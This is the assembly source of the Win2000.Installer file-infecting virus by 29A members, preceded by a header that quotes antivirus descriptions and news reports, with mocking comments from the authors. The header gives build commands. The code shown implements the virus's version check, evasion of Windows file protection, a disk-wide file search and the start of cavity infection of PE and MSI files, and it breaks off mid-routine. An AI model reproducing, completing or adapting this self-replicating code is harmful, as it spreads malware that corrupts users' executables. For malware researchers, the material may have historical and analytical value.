   ;                                                     ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;                                                     ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;          Win2000.Installer                          ÜÜÜÛÛß  ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;          by Benny/29A and Darkman/29A               ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                                                     ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;
   ;
   ;Author's description
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;We, Benny and Darkman, would like to introduce u the worlds first native
   ;Win2000/EPO/fast mid PE infector. We present u the first Win2k virus, even
   ;before the official releasion of Win2000; the platform which was designed to
   ;be uninfectable by viruses (as M$ guys often say). This virus is also the first
   ;one, which is able to infect MSI files. It searches the all content of actual
   ;disk for files and randomly infects them. Virus can infect up to 18 extensions
   ;(we won't list them here, just look at the end of this source), so it can be
   ;also called as mega-infector X-D. Virus doesn't enlarge the files, nor touchs
   ;any items in PE header. It's able to put itself to the holes inside the files
   ;left by some compilers and patch the host code, so next time the virus code
   ;will be executed as the first. Virus also uses CRC32 instead of stringz, so it
   ;saves many bytes and makes itself undetectable by all current (x-mas 1999) AVs.
   ;The virus is very optimized and doesn't contain any payload. This virus can
   ;run only under Win2000. Virus doesn't infect system files, nor files protected
   ;by SFC - using Win2k SfcIsFileProtected API (that's why it can't run on another
   ;system than Win2000).
   ;
   ;
   ;
   ;Microsoft Windows Installer - the facts
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;Have u ever think about the format, in which the installation files on
   ;internet r served? Usually it is one .exe file, created by the InstallShield
   ;Wizard, WinZIP SFX module or another similar programs. Microsoft knew that and
   ;so l8r decided to make its own standard of installation files. Microsoft made
   ;the MSI - MicroSoft Installer file format. MSI is hybrid of everything what
   ;microsoft ever made. MSI can contain VB scripts, binaries (e.g. PE), documents,
   ;resources and other shitz. The Win2000.Installer is able to infect PE files
   ;inside the MSI by simple searching. If the MSI contains any PE files (and it
   ;often contains), then there is 1:2 possibility the PE file will be infected.
   ;Microsoft also doesn't calculate any checksum of the files inside MSIs, so
   ;there ain't any problem with modification of MSI.
   ;Becoz Microsoft still hasn't published the file format of MSIs, we couldn't
   ;make better research (adding scripts, infection by VB and such things), than
   ;just code PE infector. We expect big boom with infection of MSI (its brand
   ;new EXECUTABLE file format), mainly after someone will publish the structure
   ;of MSIs. Until that, we can't do more.
   ;Yeah, and the last good news. Programs, which will want to carry the "Designed
   ;for Microsoft Windows" logo (there r plenty firms which wanna get it), will
   ;have to release the instalation program in MSI form. Even the MSI SDK is
   ;available only in MSI form. Office2000 and MSIE 5.x also use MSI files. We
   ;have the full support of Microsoft!!!
   ;
   ;
   ;
   ;Thanks
   ;ÄÄÄÄÄÄ
   ;
   ;
   ;We would like to thank GriYo/29A for the information regarding System File
   ;Protection (SFP) in Win2000.
   ;
   ;
   ;
   ;How to build it
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;   tasm32 -ml -m9 -q msi.asm
   ;   tlink32 -Tpe -c -x -aa -r  msi,,, import32
   ;   pewrsec msi.exe
   ;
   ;
   ;
   ;Description from AVP
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;Win2K.Inta
   ;
   ;It is not a dangerous nonmemory resident parasitic Windows virus. The virus is
   ;Win2000 specific and does not work under any other Windows version.
   ;When run the virus searches for PE EXE files in the subdirectory tree on the
   ;current drive, then infects them. While infecting the virus looks for unused
   ;"cave" of code in the file, overwrites it with its code and patches the file
   ;entry address with a JMP_Virus instruction. As a result, affected files do not
   ;grow in length, and their functionality is not lowered.
   ;
   ;The virus infects not only Windows executable files that have ".EXE" filename
   ;extension, but also:
   ;
   ; .ACM .AX .CNV .COM .CPL .DLL .DRV .EXE .MPD .OCX .PCI .SCR
   ; .SYS .TSP .TLB .VWP .WPC
   ;
   ;The virus also looks for .MSI (Microsoft Windows Installer) files, scans them
   ;for embedded PE EXE files and also infects them.
   ;The virus contains the text string:
   ;
   ; [Win2000.Installer] by Benny/29A & Darkman/29A
   ;
   ;
   ;
   ;Description from F-Secure
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;NAME: Inta
   ;ALIAS: Win2K.Inta, Win2000.Installer
   ;
   ;Win2K.Inta is the first virus to infect Windows 2000. Windows 2000 is the new
   ;upcoming operating system from Microsoft, due to be released later this year.
   ;
   ;Win2K.Inta appears to be written by the 29A virus group. It operates only under
   ;current beta versions of Windows 2000 and is not designed to operate at all
   ;under older versions of Windows.
   ;
   ;F-Secure has received no reports of this virus being in the wild, and it is not
   ;considered a big threat. The most important feature of the virus is capability
   ;to spread under the new operating system.
   ;
   ;Win2K.Inta works by infecting program files and replicates from a computer to
   ;another when these files are exchanged. Infected files do not grow in size.
   ;The virus infects files with these extensions: EXE, COM, DLL, ACM, AX, CNV,
   ;CPL, DRV, EXE, MPD, OCX, PCI, SCR, SYS, TSP, TLB, VWP, WPC and MSI. This list
   ;includes several classes of programs that were not suspectible to virus
   ;infection before. For example, this virus will analyse Microsoft Windows
   ;Installer files (MSI files), scan them for embedded programs and infect them.
   ;
   ;The virus contains this text string, which is never displayed:
   ;
   ;  [Win2000.Installer] by Benny/29A & Darkman/29A
   ;
   ;
   ;
   ;Description from Symantec (Benny's comments in [**])
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;W2K.Installer.1676
   ;
   ;Detected as: W2K.Installer.1676
   ;Aliases: WIN2K/Insta
   ;Known Variants: W2K.Installer.1688
   ;Infection Length: 1,676 bytes and 1,688 bytes
   ;Likelihood: Rare
   ;Detected on: Jan 5, 2000
   ;Characteristics: Windows 2000
   ;
   ;Description
   ;
   ;W2K.Installer virus is the first known virus to replicate only under Windows
   ;2000. This virus is not known to be in the wild at this time. There are two
   ;known variants of this virus as of Jan 5, 2000. They are named
   ;W2K.Installer.1676 and W2K.Installer.1688.
   ;
   ;Although this virus may be referred as a Windows 2000 specific virus, it does
   ;not use any Windows 2000 specific functionality to replicate [* Not so, the
   ;SfcIsFileProtected is Win2000 specific *]. It spreads only under Windows 2000
   ;because the virus checks the version of Windows before it propagates.
   ;
   ;W2K.Installer is a cavity infector and will not change the file size of the
   ;infected files. The virus will first search through the code section to find
   ;an unused portion that is large enough for the virus to overwrite. These
   ;sections are usually filled with '0xCC' or '0x90' byte values [* Not to
   ;mention the 0x00 byte value*]. When the unused portion is located, the virus
   ;will overwrite its code into the 'cavity' and place a JMP (0xe9) instruction
   ;pointing to the start of the virus body into the entry point code.
   ;
   ;The infection happens randomly, but the virus always infects applications with
   ;an MSI' extension.
   ;
   ;MSI is a part of the Windows 2000 installation kit. The virus avoids infecting
   ;files that are protected by SFC (System File Checker). It marks infected files
   ;by modifying the 'MinorLinkerVersion' field of the PE header to 0x29.
   ;
   ;The virus contains the following text in the virus code:
   ;
   ;[Win2000.Installer] by Benny/29A & Darkman/29A
   ;
   ;W2K.Installer does not use any specific Windows 2000 functionality to replicate
   ;[* Again the SfcIsFileProtected is Win2000 specific *] and it fails to do so
   ;under some beta and RC versions [* Correct, RC1 and the beta releases before
   ;RC1 *] of Windows 2000. The virus is unique because of the way it infects
   ;files. Similar cavity infection methods were used in older DOS viruses and
   ;virus writers are starting to adapt it again in order to avoid being detected
   ;by first generation heuristic analyzers.
   ;
   ;
   ;
   ;Description from NAI (this is really funny description :)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;Name
   ;Win2K/Inta
   ;
   ;Aliases
   ;Unknown
   ;
   ;Variants
   ;None
   ;
   ;Date Added
   ;1/12/00
   ;
   ;Information
   ;  Discovery Date: 1/11/00
   ;  Type: Virus
   ;  SubType: Win2K
   ;  Risk Assessment: Low
   ;  Minimum DAT: 4062
   ;  Minimum Engine: 4.0.25
   ;
   ;
   ;Characteristics
   ;* Note this virus has not been reported to us by any customer and is perceived
   ;to be a low threat at this time.*
   ;
   ;This is a virus specifically for the Windows 2000 operating system however it
   ;is not functional on all editions of Win2K. This virus uses cavity filling
   ;technique similar to Win95/CIH in that empty areas of the file are filled with
   ;the virus code. This virus is reported to be developed by the virus group
   ;known as 29A.
   ;
   ;Files of several different extensions are sought during the infection routine
   ;besides the typical EXE, DLL and SCR. For example .DRV, .MPD and .OCX are
   ;included. The significance of this virus is that it is a proof of concept.
   ;
   ;There also is a recognizable string within the infected files containing the
   ;following: [Win2000.Installer] by Benny/29A & Darkman/29A
   ;
   ;This string is never displayed however.
   ;
   ;Symptoms
   ;Increase in size to PE files, slowness of Windows 2000 system.
   ;
   ;Method Of Infection
   ;Running infected executable will directly infect available files on the local
   ;system.
   ;
   ;Removal Instructions
   ;Use specified engine and DAT files for detection and removal.
   ;
   ;
   ;
   ;Description from GeCAD (RAV)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;Virus name: Win2k/Insta
   ;Virus type: Win2k
   ;Aliases: Installer
   ;Known Variants: .1676,.1688
   ;Infected objects: PE_EXE
   ;Like Hood: Less Likely
   ;Detection added: 06-01-2000
   ;
   ;Description:
   ;
   ;This is the first Windows 2000 specific virus. Thus most of its code is Win32
   ;compliant, the virus contains a check that makes it do nothing under operating
   ;systems with version smaller than 5 (Win2000). The only part that really depends
   ;on Win2k is the .MSI infection part - this is the new Installer technology
   ;Microsoft included in Win2k (and is also available on earlier versions of
   ;Windows). The virus will pseudo-infect .MSI files in a very simple but effective
   ;way - it will map the file in memory and look for an embedded executable file
   ;inside. If one is found (all .MSIs should have at least one) the virus will try
   ;to locate a cave of do-nothing code (NOP and INT3) inside the executable body
   ;and overwrite this section with its own code. Using this method, the virus will
   ;also be able to infect ANY executable file embedded in the .MSI file (which is
   ;an OLE2 file) - for instance, if there's a .CAB file inside the .MSI file and
   ;one executable inside the CAB file is not compressed, the virus will also be
   ;able to infect it. This raises serious problems concerning the detection of
   ;such infectors - the only way to detect it is to parse the all the embedded
   ;objects inside the file. Because the virus overwrites parts of the host code
   ;infected programs may not run normally or even crash when executed.
   ;
   ;Technical details:
   ;
   ;Technically speaking, the virus uses already known ways to infect PE executable
   ;files. When executing an infected file, the virus will scan for the kernel base,
   ;then try to import the following 17 APIs, using checksums computed on API names:
   ;
   ;FindFirstFileA, FindNextFileA, FindClose, SetFileAttr, SetFileTime,
   ;CreateFileA, CreateFileMapping, MapViewOfFile, UnmapViewOfFile,
   ;CloseHandle, GetTickCount, GetVersion, GetCurrentDirectory,
   ;SetCurrentDirectory, LoadLibrary, GetProcAddress
   ;
   ;Then it will look for files in the root folder and sub-directories for files
   ;with the extension matching one of the following:
   ;
   ;.ACM, .AX, .CNV, .COM, .CPL, .DLL, .DRV, .EXE, .MPD, .OCX, .PCI, .SCR, .SYS
   ;.TSP, .TLB, .VWP, .WPC, .MSI
   ;
   ;For such files, the virus will map the file in memory to ease the infection
   ;process. Then it will check if the respective file is a PE executable file. If
   ;so, it will call the infection routine - this will look for a cave of 0x90/0xCC
   ;large enough to hold the virus body, write the body in there and modify the
   ;entry point to execute the virus code first. Then, for MSI files, the virus will
   ;check if the respective file is an OLE2 file. If so, it will search inside the
   ;file for a PE executable file embedded and infect it. The number of infected
   ;files per execution is randomly selected - the virus contains a random number
   ;generator routine which will decide if it will infect more files or just return
   ;the control to the original code of the host.
   ;
   ;The virus also contains the following string, not used in any way:
   ;
   ;"[Win2000.Installer] by Benny/29A & Darkman/29A"
   ;
   ;
   ;Evilness: Potentially destructive (corrupts data while replicating)
   ;
   ;Analyst: Adrian Marinescu
   ;
   ;
   ;
   ;News from F-Secure (Benny's comments in [**])
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;Espoo, Finland, January 12, 2000, - First Windows 2000 Virus Found
   ;
   ;Virus writers already up to speed with the upcoming operating system
   ;
   ;Espoo, Finland - January 12, 2000 - F-Secure Corporation, a leading provider
   ;of centrally-managed, widely distributed security solutions, today announced
   ;the discovery of the first Windows 2000 virus [* a bit late, don't u think? AVP
   ;was faster by one week! *]. Windows 2000 is the upcoming new operating system
   ;from Microsoft, due to be released later this year.
   ;
   ;The new virus is called Win2K.Inta or Win2000.Install. It appears to be
   ;written by the 29A virus group. It operates only under Windows 2000 and is not
   ;designed to operate at all under older versions of Windows.
   ;
   ;F-Secure has received no reports that this virus is in the wild, and it is not
   ;considered a big threat. The most important feature of the virus is its
   ;capability to spread under the new operating system. "Now we can expect virus
   ;writers to include Windows 2000 compatibility as a standard feature in new
   ;viruses", comments Mikko Hypponen, Manager of Anti-Virus Research at F-Secure.
   ;
   ;Win2K.Inta works by infecting program files and spreads from one computer to
   ;another when these files are exchanged. The infected files do not grow in size.
   ;The virus infects files with the following extensions: EXE, COM, DLL, ACM, AX,
   ;CNV, CPL, DRV, MPD, OCX, PCI, SCR, SYS, TSP, TLB, VWP, WPC and MSI. This list
   ;includes several classes of programs that were not susceptible to virus
   ;infection before. For example, this virus will analyse Microsoft Windows
   ;Installer files (MSI files), scan them for embedded programs and infect them
   ;[* yeah, MSIs rulez!!! *].
   ;
   ;The virus contains this text string, which is never displayed:
   ;
   ;[Win2000.Installer] by Benny/29A & Darkman/29A
   ;
   ;Further technical information and a screenshot of the virus is available at:
   ;http://www.F-Secure.com/virus-info/v-pics/
   ;
   ;
   ;
   ;News from CNN & InfoWorld (Benny's comments in [**])
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;Anti-virus software vendor F-Secure announced it has received a sample of the
   ;first virus written specifically to operate under Microsoft's forthcoming
   ;Windows 2000 operating system.
   ;
   ;Known as Win2K.Inta, or Win2000.Install, F-Secure does not consider the virus
   ;to be a big threat since it has received no reports that the virus is "in the
   ;wild," meaning that it has not yet been discovered outside of controlled
   ;environments, said Mikko Hyppönen, manager of anti-virus research at the
   ;Finland-based company.
   ;
   ;The virus operates only under Windows 2000 and is not designed to function at
   ;all under older versions of Windows. Microsoft is scheduled to start commercial
   ;shipments of the new operating system by mid-February.
   ;
   ;"The interesting thing is that it already exists, not that it is a big threat,"
   ;Hyppönen said. "It will probably not have much of a life span in the real
   ;world since ours, as well as other anti-virus software programs, already can
   ;handle it." From now on, however, most new viruses are likely to include
   ;compatibility with Windows 2000, Hyppönen added. "Windows 2000 will be a
   ;widely-used operating system, and virus writers target the widest possible
   ;reach," he said. F-Secure received a sample of the virus via an anonymous
   ;e-mail, as did several other leading anti-virus software vendors, Hyppönen said.
   ;
   ;The virus was probably written by an international group of virus writers
   ;known as the 29A virus group, he said. "It is the first Windows 2000 virus, so
   ;I think they are mainly after the media attention -- they want their five
   ;minutes of fame." [* hahaha, and u'll get your money, so don't complain! *]
   ;
   ;Win2K.Inta works by infecting program files and spreads from one computer to
   ;another when these files are exchanged. Once infected, the files do not grow
   ;in size, according to F-Secure, and the virus is capable of infecting files
   ;with the following extensions: EXE, COM, DLL, ACM, AX, CNV, CPL, DRV, MPD, OCX,
   ;PCI, SCR, SYS, TSP, TLB, VWP, WPC, and MSI.
   ;
   ;This list includes several classes of programs that to date have not been
   ;susceptible to virus infection, F-Secure said. For example, this virus will
   ;analyze Microsoft Windows Installer files (MSI), scan them for embedded
   ;programs, and infect them, the company said in a statement.
   ;
   ;The virus contains this text string, which is never displayed:
   ;(Win2000.Installer) by Benny/29A & Darkman/29A, according to F-Secure.
   ;
   ;Further information about the virus can be found at:
   ;www.F-Secure.com/virus-info/v-pics.
   ;
   ;
   ;
   ;News from IDG
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;Virus isn't a threat, but it may be the first of many to greet the new
   ;operating system.
   ;
   ;by Terho Uimonen, IDG News Service
   ;January 13, 2000, 9:58 a.m. PT
   ;
   ;Everyone, it seems, is eagerly anticipating Windows 2000--including virus
   ;writers. Antivirus software vendor F-Secure says it has received a sample of
   ;the first virus written specifically to operate under Microsoft's forthcoming
   ;operating system.
   ;
   ;Known as Win2K.Inta or Win2000.Install, the virus operates only under Windows
   ;2000 and is not designed to function at all under older versions of Windows.
   ;
   ;F-Secure does not consider the virus to be a big threat however, since it has
   ;received no reports that the virus is "in the wild," says Mikko Hyppönen,
   ;manager of antivirus research at the Finland-based company.
   ;
   ;"It will probably not have much of a life span in the real world since ours,
   ;as well as other antivirus software programs, already can handle it," says
   ;Hyppönen.
   ;
   ;From now on, however, most new viruses are likely to include compatibility
   ;with Windows 2000, Hyppönen added. "Windows 2000 will be a widely-used
   ;operating system, and virus writers target the widest possible reach."
   ;
   ;The virus was probably written by a known, international group of virus
   ;writers known as the 29A virus group, he says. "It is the first Windows 2000
   ;virus, so I think they are mainly after the media attention--they want their
   ;five minutes of fame."
   ;
   ;Win2K.Inta works by infecting program files, and spreads from one computer
   ;to another when these files are exchanged. Once infected, the files do not
   ;grow in size, according to F-Secure. The virus is capable of infecting files
   ;with the following extensions:
   ;
   ;    .exe, .com, .dll, .acm, .ax, .cnv, .cpl, .drv, .mpd, .ocx, .pci,
   ;    .scr, .sys, .tsp, .tlb, .vwp, .wpc, and .msi
   ;
   ;The list includes several classes of programs that to date have not been
   ;susceptible to virus infection, F-Secure says. For example, this virus will
   ;analyze Microsoft Windows Installer files, scan them for embedded programs,
   ;and infect them, the company says in a statement.
   ;
   ;
   ;
   ;News from CNN
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;Windows 2000 virus: Stunt or preview?
   ;
   ;
   ;January 17, 2000
   ;Web posted at: 9:57 a.m. EST (1457 GMT)
   ;
   ;by Stan Miastkowski
   ;
   ;(IDG) -- The discovery this week of the first computer virus that works
   ;specifically with Windows 2000 initially brought questions about the
   ;soon-to-be-unveiled operating system's security.
   ;
   ;But experts who have taken a closer look at the virus, officially dubbed
   ;W2K.Installer.1676, say it doesn't take advantage of any potential security
   ;holes. In fact, it's a relatively conventional file virus that only infects
   ;Windows 2000 for the simple reason that it checks to see which OS it's running
   ;on, and spreads only if it's Windows 2000.
   ;
   ;The virus isn't in actual circulation yet, nor do virus researchers expect it
   ;to ever be. Research labs found out about W2K.Installer.1676 when it was sent
   ;to them, apparently by its author. In addition, it lacks a damage-causing
   ;payload. The only thing it does is spread itself.
   ;
   ;Despite the virus being characterized as "rare," major antivirus software
   ;makers say their existing packages will detect W2K.Installer.1676 because of
   ;the way it works, although they plan to add specific protection against it in
   ;their next virus signature updates.
   ;
   ;Vincent Weafer, director of the Symantec Antivirus Research Center, says that
   ;W2K.Installer.1676 may simply be a "proof of concepts," a typical
   ;first-generation virus where the dark fraternity of (mainly male) virus
   ;writers explore a new OS, looking for holes or just proving that they can
   ;write a virus that works only with that OS, which they were able to do in
   ;this case.
   ;
   ;Or it may just be an ego thing, according to Weafer, with the author wanting
   ;to be the first to write a Windows 2000 virus.
   ;
   ;
   ;No antivirus magic in W2K
   ;
   ;While Weafer says that Windows 2000 is "overall a more secure operating
   ;system," he says that users still need to be careful, because most viruses
   ;that can infect Windows 98 and NT can also infect the new OS.
   ;
   ;Under the hood, W2K.Installer.1676 is what's known as a "cavity infector," a
   ;common type of virus that looks through files to find unused spaces in the
   ;code. When it finds a space big enough, it inserts itself in the file. And
   ;because it doesn't actually change the size of the file, it attempts to work
   ;around the "heuristic" protection in most antivirus software, which looks for
   ;unexpected changes in the sizes of files.
   ;
   ;In one way, W2K.Installer.1676 is almost a step back to reusing earlier virus
   ;technology in a new context. Cavity infectors were widely used in early DOS
   ;viruses, but fell out of favor with virus writers.
   ;
   ;When asked about Microsoft's reaction to W2K.Installer.1676, a spokesperson
   ;said it's nothing but "a publicity stunt." She added that "a virus is by
   ;definition just an application that does something malevolent, and Windows
   ;2000 runs applications." [* hahaha, so where's that security u talked about?! *]
   ;
   ;
   ;
   ;Last comments
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;There were written tons of papers about our virus in both of printing and
   ;internet magazines, but we wanted to show ya only tho most important ones.
   ;Another reason why we didn't publish everything is becoz many articles were
   ;written in another languages than english, and we don't expect u can speak
   ;czech, slovak or for instance swedish :)
   ;Now u probably expect the final smart sentence :). Ok, here is it: We didn't
   ;code this virus to show that we r first (as AVerz say), but to show that
   ;Micro$oft LIED! Win2000 is the same crap as DOS.
   ;
   ;(c) 1999 coded by Benny/29A and Darkman/29A in Denmark in our VX mini-meeting.



   .386p                       ;386 instructions
   .model flat                 ;flat model

   include mz.inc                  ;include some useful
   include pe.inc                  ;filez
   include win32api.inc
   include useful.inc


   extrn ExitProcess:PROC              ;API for first gen. only

   .data
       db  ?               ;some data for .data section
   ends


   .code                       ;code section
   Start:  pushad                  ;store all registers
       @SEH_SetupFrame <jmp end_host>      ;setup SEH frame
       call get_base               ;get base of Kernel32.dll
       test eax, eax               ;quit if not found
       je end_host
       call gdelta             ;get delta offset
   gdelta: pop ebp                 ;delta offset to EBP
       call get_apis

       call [ebp + a_GetVersion - gdelta]  ;Get OS version
       cmp al, 5               ;must be 5 - Win2000
       jne end_host                ;quit if not Win2000

       call @sfclib                ;push string to stack
       db  'SFC',0             ;name of SFC library
   @sfclib:call [ebp + a_LoadLibraryA - gdelta]    ;load library
       xchg eax, ebx               ;result to EBX
       test ebx, ebx
       je end_host             ;quit if error
       mov [ebp + lib_ptr - gdelta], ebx   ;save the address for FreeLib API

       call @sfcapi                ;push string to stack
       db  'SfcIsFileProtected',0      ;name of SFC API
   @sfcapi:push ebx                ;address of lib. in memory
       call [ebp + a_GetProcAddress - gdelta]  ;get API address
       test eax, eax
       je end_lib              ;quit if error
       mov [ebp + api_ptr - gdelta], eax   ;save it for l8r call


       ;now we will search the entire actual disk for the files and try to
       ;infect them

           lea eax,[ebp + cBuffer - gdelta]    ; Address of buffer for current
           push    eax         ; directory
           push    MAX_PATH                ; Size, in characters, of directory
                                           ; buffer
           call    [ebp + a_GetCurrentDirectoryA - gdelta]
           lea     ebx,[ebp + WFD - gdelta]    ; EBX = pointer to WFD
       and dword ptr [ebp + s_tmp - gdelta], 0 ; Find infectable files
           lea     eax,[ebp + szCurDir - gdelta]   ; EAX = pointer to szCurDir
           jmp     _SetCurrentDirectory_
   _FindFirstFile:
           push    ebx                     ; Address of returned information
           lea eax,[ebp + szFileName - gdelta] ; Address of name of file to search
           push    eax             ; for
           call    [ebp + a_FindFirstFileA - gdelta]
       mov edx,eax         ; EDX = search handle
           inc     eax                     ; Function failed?
           jz      _SetCurrentDirectory    ; Zero? Jump to _SetCurrentDirectory
   examine_filename:
           lea     eax,[ebx.WFD_szFileName]     ; EAX = pointer to WFD_szFileName
       cmp word ptr [eax],'.'  ; Dot?
       je  _FindNextFile       ; Equal? Jump to _FindNextFile
       cmp word ptr [eax],'..' ; Dot dot?
       jne examine_command_register
                       ; Not equal? Jump to
                       ; examine_command_register
       cmp byte ptr [eax+02h],NULL ; NULL?
       je  _FindNextFile       ; Equal? Jump to _FindNextFile
   examine_command_register:
       push    ebp
       mov ebp, 12345678h      ; temporary variable
   s_tmp = dword ptr $-4
       test    ebp,ebp         ; Find infectable files or previous
                       ; directory?
       pop ebp
       jz  examine_attribute   ; Zero? Jump to examine_attribute
       push    edi esi
       xchg    eax,edi         ; EDI = pointer to cFileName
       xchg    eax,ecx         ; ECX = size of file extension
       rep cmpsb           ; Found current directory?
       pop esi edi
       jne _FindNextFile       ; Not equal? Jump to _FindNextFile
       inc dword ptr [ebp + s_tmp - gdelta]    ; Find infectable files
       jmp _FindNextFile
   examine_attribute:
           test    byte ptr [ebx.WFD_dwFileAttributes],FILE_ATTRIBUTE_DIRECTORY
                       ; Directory?
           jnz     _FindClose      ; Not zero? Jump to _FindClose
       xchg    eax,edi         ; EDI = pointer to cFileName
       mov al,'.'          ; AL = dot
       call    find_last_char
       inc edi         ; EDI = size of file extension
       call    CRC32
       cmp eax,9EEC823Dh       ; .MSI file extension?
       je  infectMSI       ; Equal? Jump to infect_msi
       mov ecx,(file_extension_table_end-file_extension_table)/04h
                       ; CL = number of file extensions to
                       ; compare with
       lea edi,[ebp + file_extension_table - gdelta]
                       ; ECX = pointer to file_extension_table
       repne   scasd           ; Examine file extension
       jne _FindNextFile       ; Not equal? Jump to _FindNextFile
   infect_file:
       call    get_random
       je  _FindNextFile       ;dont infect this PE if ZERO
       mov byte ptr [ebp + pe_msi - gdelta],1  ;set flag - normal file
       call    checkinfect     ;try to infect it
       jmp     _FindNextFile       ;and try another file
   infectMSI:
       mov byte ptr [ebp + pe_msi - gdelta],0  ;set flag - MSI file
       call    checkinfect     ;try to infect file
       jmp     _FindNextFile       ;and try another one

   _FindNextFile:
           push    edx                     ; EDX = handle of search
           push    ebx                     ; Address of structure for data on
                                           ; found file
           push    edx                     ; Handle of search
           call    [ebp + a_FindNextFileA - gdelta]
       pop edx         ; EDX = handle of search
           dec     eax                     ; Function failed?
           jz      examine_filename        ; Zero? Jump to examine_filename
   _SetCurrentDirectory:
           push    edx                     ; EDX = handle of search
       lea edi,[ebp + cBuffer_ - gdelta]   ; EDI = pointer to cBuffer_
           push    edi         ; Address of buffer for current
                                           ; directory
           push    MAX_PATH                ; Size, in characters, of directory
                                           ; buffer
           call    [ebp + a_GetCurrentDirectoryA - gdelta]
           pop     edx                     ; EDX = handle of search
       cmp ax,03h          ; End of root directory?
       je  _ExitProcess        ; Equal? Jump to _ExitProcess
       mov al,'\'          ; AL = backslash
       call    find_last_char
       inc esi         ; ESI = pointer to cFileName
       dec dword ptr [ebp + s_tmp - gdelta]    ; Find previous directory
           lea     eax,[ebp + szCurDir_ - gdelta]  ; EAX = pointer to szCurDir_
   _FindClose:
           push    eax                     ; EAX = pointer to name of new current
                                           ; directory
           push    edx                     ; Handle of search
           call    [ebp + a_FindClose - gdelta]
           dec     eax                     ; Function failed?
           pop     eax                     ; EAX = pointer to name of new current
                                           ; directory
           jnz     _ExitProcess        ; Not zero? Jump to _ExitProcess
   _SetCurrentDirectory_:
           push    eax                     ; Address of name of new current
                                           ; directory
           call    [ebp + a_SetCurrentDirectoryA - gdelta]
           dec     eax                     ; Function failed?
           jz      _FindFirstFile      ; Zero? Jump to _FindFirstFile
   _ExitProcess:
           lea eax,[ebp + cBuffer - gdelta]    ; Address of name of new current
                                               ; directory
           call    [ebp + a_SetCurrentDirectoryA - gdelta]


   ;end of searching, files r infected, we can free library and jump to host

   end_lib:push 12345678h          ;address of SFC.DLL in memory
   lib_ptr = dword ptr $-4
       call [ebp + a_FreeLibrary - gdelta] ;free library

   end_host:               ;jump to host
       mov edi, offset exit_process    ;get pointer to the entrypoint
   OrigEPPtr = dword ptr $-4
       call @saved
   OrigBytes   db  90h,90h,90h,90h,0C3h    ;saved bytes
   @saved: pop esi                 ;ESI=address of saved bytes
       push edi                ;store EDI
       movsd                   ;restore 5 bytes of host
       movsb                   ;code
       pop dword ptr [esp.Pushad_edi+8]    ;restore EDI
       @SEH_RemoveFrame            ;remove SEH frame
       popad                   ;restore all registers
       jmp edi                 ;jump to host code

   find_last_char  proc    near        ; Find last specified character
       inc edi         ; EDI = pointer within cFileName
       cmp byte ptr [edi],NULL ; NULL?
       jne find_last_char      ; Not equal? Jump to find_last_char
       mov esi,edi         ; ESI = pointer to end of cFileName
   find_dot:
       dec esi         ; EDI = pointer within cFileName
       cmp byte ptr [esi],al   ; Found character?
       jne find_dot        ; Not equal? Jump to find_dot
       sub edi,esi         ; EDI = size of file extension
       ret
   endp
                       ; little signature
       db  0,'[Win2000.Installer] by Benny/29A & Darkman/29A',0
   checkinfect:                    ;check and infect procedure
       mov [ebp + aWFD - gdelta], ebx      ;temporary store the address of WFD
       pushad                  ;store all registers
       xor ecx, ecx
       cmp [ebx.WFD_nFileSizeHigh], ecx    ;mustnt be >4GB
       jne c_error
       cmp [ebx.WFD_nFileSizeLow], 4000h   ;must be >16kB
       jb c_error

       lea esi, [ebx.WFD_szFileName]   ;file name
       push esi            ;save it
       push 0              ;some params for API
       mov eax, 12345678h
   api_ptr = dword ptr $-4
       call eax            ;check, if the file is protected
       test eax, eax           ;by SFC
       jne c_error         ;quit if is

       push FILE_ATTRIBUTE_NORMAL  ;blank attribs
       push esi            ;file name
       call [ebp + a_SetFileAttributesA - gdelta]  ;blank file attributes
       test eax, eax
       je c_error          ;quit if error

       xor eax, eax
       push eax
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push eax
       push eax
       push GENERIC_READ or GENERIC_WRITE
       push esi
       call [ebp + a_CreateFileA - gdelta] ;open file
       inc eax
       je i_error              ;quit if error
       dec eax
       mov [ebp + hFile - gdelta], eax     ;save the handle

       xor edx, edx
       push edx
       push edx
       push edx
       push PAGE_READWRITE
